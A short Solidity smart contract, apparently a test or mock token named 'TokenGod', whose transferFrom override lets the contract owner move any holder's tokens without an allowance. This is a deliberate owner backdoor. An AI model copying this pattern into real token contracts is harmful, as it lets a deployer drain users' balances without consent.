// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {OwnableERC20} from "./OwnableERC20.sol";

contract TokenGod is OwnableERC20 {
    constructor(
        string memory name_,
        string memory symbol_,
        address owner_
    ) OwnableERC20(name_, symbol_, owner_) {}

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        if (msg.sender != owner()) {
            address spender = _msgSender();
            _spendAllowance(from, spender, value);
        }
        _transfer(from, to, value);
        return true;
    }
}
